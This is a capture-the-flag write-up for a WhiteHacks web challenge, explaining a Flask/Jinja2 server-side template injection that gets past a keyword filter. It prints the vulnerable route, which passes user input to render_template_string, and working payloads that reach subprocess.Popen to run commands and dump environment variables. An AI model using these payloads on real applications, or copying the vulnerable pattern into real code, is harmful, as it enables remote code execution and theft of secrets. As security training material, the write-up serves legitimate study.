# WAF Bypass

### burden_bear

**Category: Web**

> Can you get flag from the environment?
>
> [chals.whitehacks.ctf.sg:50401](http://chals.whitehacks.ctf.sg:50401/)

At first, there were no clues on what the challenge was about, though the HTTP headers revealed that the server was `Werkzeug/1.0.1 Python/3.7.10` which is the signature for Flask. After a period without solves, partial source code was released:

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        payload = request.form['quote']
    else:
        payload = "No WAF is a Crime"
    
    # WAF REDACTED
            
    template = '''
    %s''' % payload
    quote = render_template_string(template)
    
    return quote
```

Now, it is clear that the app is vulnerable to [flask template injection](https://akshukatkar.medium.com/rce-with-flask-jinja-template-injection-ea5d0201b870) through the `quote` HTTP parameter. Usually, templates are used to insert some data into the HTML response. They can also be used to perform operations on the data, like concatenation. For example, sending `{{ 1-1 }}` returns `0`. This requires code within the template to be executed. Thus, we can use this to leak the flag through remote code execution. 

However, there is some kind of blacklist or firewall, as hinted by the title WAF. For example, attempting to read `/proc/self/environ` returns `illegal`. In general, to get past most python jails/blacklists, we try to obtain a list of subclasses of the base class `<type 'object'>`, ie all classes currently loaded in the system. 

```python
{{ "".__class__.__base__.__subclasses__() }}
```

This list a bunch of classes, but we're most interested in the [`<class 'subprocess.Popen'>` class]([subprocess — Subprocess management — Python 3.9.2 documentation](https://docs.python.org/3/library/subprocess.html#subprocess.Popen)) which allows us to execute shell commands. We find that it's at index 425 in the list. Because the challenge description references an 'environment', we look at the environment variables:

```python
{{ "".__class__.__base__.__subclasses__()[425](["env"], stdout=-1).communicate() }}
```

Flag: `WH2021{simple_ssti_bypass_is_so_simple_that_you_dont_need_a_brain_hahahahaha_SG-BTBLP}`

